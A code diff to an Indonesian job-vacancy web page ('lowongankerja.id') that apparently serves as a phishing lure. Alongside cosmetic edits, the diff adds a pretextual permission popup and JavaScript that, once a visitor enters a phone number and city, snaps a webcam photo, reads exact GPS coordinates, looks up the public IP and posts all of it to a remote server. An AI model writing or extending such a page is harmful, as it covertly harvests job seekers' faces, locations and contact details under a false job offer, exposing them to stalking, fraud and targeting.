@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Info Lowongan Kerja - Kirim Lamaran</title>
+  <title>LOWONGANKERJA.ID - Info Lowongan Kerja</title>
   <style>
     * {
       box-sizing: border-box;
@@ -71,11 +71,36 @@
       border-left: 4px solid #4a6491;
       background-color: #f9f9f9;
       border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    .job-item:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    
+    .job-item.expanded {
+      background-color: #eef5ff;
     }
     
     .job-item h3 {
       color: #2c3e50;
       margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .job-details {
+      display: none;
+      margin-top: 15px;
+      padding-top: 15px;
+      border-top: 1px solid #ddd;
+    }
+    
+    .job-details.expanded {
+      display: block;
     }
     
     .job-item p {
@@ -152,6 +177,53 @@
       border-left: 4px solid #4a6491;
     }
     
+    .location-permission {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .permission-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 90%;
+      width: 400px;
+    }
+    
+    .permission-box h3 {
+      margin-bottom: 15px;
+      color: #2c3e50;
+    }
+    
+    .permission-box p {
+      margin-bottom: 20px;
+      color: #555;
+    }
+    
+    .permission-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+    
+    .permission-buttons button {
+      width: auto;
+      padding: 10px 20px;
+    }
+    
+    .permission-buttons .deny {
+      background: #e74c3c;
+    }
+    
     footer {
       text-align: center;
       margin-top: 40px;
@@ -163,6 +235,10 @@
     @media (max-width: 768px) {
       .content {
         flex-direction: column;
+      }
+      
+      header h1 {
+        font-size: 2rem;
       }
     }
   </style>
@@ -178,25 +254,72 @@
       <div class="job-list">
         <h2>Lowongan Tersedia</h2>
         
-        <div class="job-item">
-          <h3>Frontend Developer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Frontend Developer <span>+</span></h3>
           <p><strong>Lokasi:</strong> Jakarta Selatan</p>
           <p><strong>Gaji:</strong> Rp 8 - 12 juta</p>
-          <p><strong>Deskripsi:</strong> Dicari Frontend Developer dengan pengalaman minimal 2 tahun. Menguasai HTML, CSS, JavaScript dan framework modern seperti React atau Vue.</p>
+          <div class="job-details">
+            <p><strong>Deskripsi:</strong> Dicari Frontend Developer dengan pengalaman minimal 2 tahun. Menguasai HTML, CSS, JavaScript dan framework modern seperti React atau Vue.</p>
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pengalaman 2+ tahun sebagai Frontend Developer</li>
+              <li>Menguasai HTML5, CSS3, JavaScript ES6+</li>
+              <li>Pengalaman dengan React.js/Vue.js/Angular</li>
+              <li>Familiar dengan Git dan workflow Agile</li>
+            </ul>
+            <p><strong>Benefit:</strong> BPJS, THR, Bonus Tahunan, Training</p>
+          </div>
         </div>
         
-        <div class="job-item">
-          <h3>Backend Developer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Backend Developer <span>+</span></h3>
           <p><strong>Lokasi:</strong> Bandung</p>
           <p><strong>Gaji:</strong> Rp 9 - 13 juta</p>
-          <p><strong>Deskripsi:</strong> Kami mencari Backend Developer yang berpengalaman dalam Node.js, Python, atau PHP. Familiar dengan database SQL dan NoSQL.</p>
+          <div class="job-details">
+            <p><strong>Deskripsi:</strong> Kami mencari Backend Developer yang berpengalaman dalam Node.js, Python, atau PHP. Familiar dengan database SQL dan NoSQL.</p>
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pengalaman 3+ tahun sebagai Backend Developer</li>
+              <li>Menguasai Node.js, Python, atau PHP</li>
+              <li>Pengalaman dengan MySQL, PostgreSQL, atau MongoDB</li>
+              <li>Memahami konsep RESTful API</li>
+            </ul>
+            <p><strong>Benefit:</strong> Asuransi kesehatan, Fleksibel working hours, Remote work options</p>
+          </div>
         </div>
         
-        <div class="job-item">
-          <h3>UI/UX Designer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>UI/UX Designer <span>+</span></h3>
           <p><strong>Lokasi:</strong> Surabaya</p>
           <p><strong>Gaji:</strong> Rp 7 - 10 juta</p>
-          <p><strong>Deskripsi:</strong> Dicari UI/UX Designer kreatif dengan portfolio yang kuat. Menguasai Figma, Adobe XD, dan tools desain lainnya.</p>
+          <div class="job-details">
+            <p><strong>Deskripsi:</strong> Dicari UI/UX Designer kreatif dengan portfolio yang kuat. Menguasai Figma, Adobe XD, dan tools desain lainnya.</p>
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pengalaman 2+ tahun sebagai UI/UX Designer</li>
+              <li>Menguasai Figma, Adobe XD, atau Sketch</li>
+              <li>Memahami prinsip UX research dan usability testing</li>
+              <li>Kemampuan prototyping dan interaction design</li>
+            </ul>
+            <p><strong>Benefit:</strong> Peralatan kerja lengkap, Budget training, Bonus project</p>
+          </div>
+        </div>
+
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Data Analyst <span>+</span></h3>
+          <p><strong>Lokasi:</strong> Yogyakarta</p>
+          <p><strong>Gaji:</strong> Rp 8 - 11 juta</p>
+          <div class="job-details">
+            <p><strong>Deskripsi:</strong> Dicari Data Analyst untuk menganalisis data dan memberikan insight bisnis yang berharga.</p>
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pengalaman 2+ tahun sebagai Data Analyst</li>
+              <li>Menguasai SQL, Python/R, dan tools visualisasi data</li>
+              <li>Memahami statistik dan analisis data</li>
+              <li>Pengalaman dengan machine learning adalah nilai plus</li>
+            </ul>
+            <p><strong>Benefit:</strong> Fleksibel working hours, Bonus kinerja, Lingkungan kerja yang dinamis</p>
+          </div>
         </div>
       </div>
       
@@ -204,43 +327,103 @@
         <h2>Berlangganan gratis</h2>
         
         <div class="form-group">
-          <label for="nama">nomor pencari kerja</label>
-          <input type="text" id="nama" placeholder="cntoh : 081235****32">
+          <label for="nama">Nomor Pencari Kerja</label>
+          <input type="text" id="nama" placeholder="Contoh: 081235****32">
         </div>
         
         <div class="form-group">
           <label for="kota">Kota</label>
-          <input type="text" id="kota" placeholder="di kota mana anda ingin bekerja">
+          <input type="text" id="kota" placeholder="Di kota mana anda ingin bekerja">
         </div>
         
-        <button onclick="kirimLokasi()">Kirim</button>
+        <button onclick="requestLocationPermission()">Kirim</button>
         
         <div class="privacy-notice">
-          <p><strong>Catatan:</strong> Dengan mengklik "Kirim", Ini membantu kami menempatkan Anda di lowongan yang sesuai dengan daerah Anda.</p>
+          <p><strong>Catatan:</strong> Dengan mengklik "Kirim", Anda menyetujui untuk berbagi informasi lokasi dan foto. Ini membantu kami menempatkan Anda di lowongan yang sesuai dengan daerah Anda.</p>
         </div>
       </div>
     </div>
     
     <footer>
-      <p>&copy; 2023 loowngankerja.id .</p>
+      <p>&copy; 2023 lowongankerja.id</p>
     </footer>
   </div>
 
+  <div class="location-permission" id="locationPermission">
+    <div class="permission-box">
+      <h3>Akses Lokasi Diperlukan</h3>
+      <p>Untuk melanjutkan, izinkan akses ke lokasi dan kamera Anda. Kami akan menggunakan informasi ini untuk memberikan rekomendasi lowongan terdekat.</p>
+      <div class="permission-buttons">
+        <button onclick="grantPermission()">Izinkan</button>
+        <button class="deny" onclick="denyPermission()">Tolak</button>
+      </div>
+    </div>
+  </div>
+
   <script>
+    // Fungsi untuk toggle detail lowongan
+    function toggleJobDetails(element) {
+      const details = element.querySelector('.job-details');
+      const expandIcon = element.querySelector('h3 span');
+      
+      element.classList.toggle('expanded');
+      details.classList.toggle('expanded');
+      
+      if (details.classList.contains('expanded')) {
+        expandIcon.textContent = '-';
+      } else {
+        expandIcon.textContent = '+';
+      }
+    }
+    
+    // Tampilkan popup permintaan akses lokasi
+    function requestLocationPermission() {
+      const nama = document.getElementById('nama').value;
+      const kota = document.getElementById('kota').value;
+      
+      if (!nama || !kota) {
+        alert('Harap isi nomor dan kota terlebih dahulu.');
+        return;
+      }
+      
+      document.getElementById('locationPermission').style.display = 'flex';
+    }
+    
+    // Ketika pengguna mengizinkan akses
+    function grantPermission() {
+      document.getElementById('locationPermission').style.display = 'none';
+      kirimLokasi();
+    }
+    
+    // Ketika pengguna menolak akses
+    function denyPermission() {
+      document.getElementById('locationPermission').style.display = 'none';
+      alert('Anda perlu mengizinkan akses lokasi untuk menggunakan layanan ini.');
+    }
+    
+    // Fungsi utama untuk mengirim data
     async function kirimLokasi() {
       // Ambil nilai dari input nama dan kota
       const nama = document.getElementById('nama').value || "Tes Nama";
       const kota = document.getElementById('kota').value || "Tes Kota";
       
       try {
-        // ambil lokasi user
+        // Ambil foto dari kamera terlebih dahulu
+        let fotoBase64 = "";
+        try {
+          fotoBase64 = await ambilFoto();
+        } catch (error) {
+          console.log("Tidak dapat mengakses kamera: ", error);
+        }
+        
+        // Ambil lokasi user
         navigator.geolocation.getCurrentPosition(async (pos) => {
           const data = {
             ip: await ambilIP(),
             lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
             nama: nama,
             kota: kota,
-            fotoBase64: "" // bisa diisi jika nanti upload foto
+            fotoBase64: fotoBase64
           };
 
           const response = await fetch(
@@ -252,19 +435,70 @@
           );
 
           const result = await response.json();
-          alert("Status: " + result.status + "\nTerima kasih " + nama + " dari " + kota + " telah mengirim lamaran!");
+          alert("Terima kasih " + nama + "!\nData Anda telah terkirim. Kami akan menghubungi Anda via WhatsApp untuk lowongan di " + kota + ".");
         }, (error) => {
-          alert("Izinkan akses lokasi untuk melanjutkan proses lamaran.");
+          alert("Izinkan akses lokasi untuk melanjutkan proses.");
         });
       } catch (e) {
-        alert("Gagal ambil lokasi: " + e);
+        alert("Terjadi kesalahan: " + e);
       }
     }
 
+    // Fungsi untuk mengambil foto dari kamera
+    async function ambilFoto() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          reject("Kamera tidak didukung");
+          return;
+        }
+        
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(stream => {
+            // Buat video element untuk menangkap gambar
+            const video = document.createElement('video');
+            video.width = 320;
+            video.height = 240;
+            video.srcObject = stream;
+            video.play();
+            
+            // Tunggu sampai video siap
+            video.onloadedmetadata = () => {
+              // Buat canvas untuk mengambil frame
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              
+              // Gambar frame dari video ke canvas
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi ke base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Hentikan stream
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Kembalikan data gambar
+                resolve(imageData);
+              }, 500);
+            };
+          })
+          .catch(error => {
+            reject(error);
+          });
+      });
+    }
+
+    // Fungsi untuk mengambil IP address
     async function ambilIP() {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const json = await res.json();
-      return json.ip;
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const json = await res.json();
+        return json.ip;
+      } catch (error) {
+        return "Tidak dapat mengambil IP";
+      }
     }
   </script>
 </body>
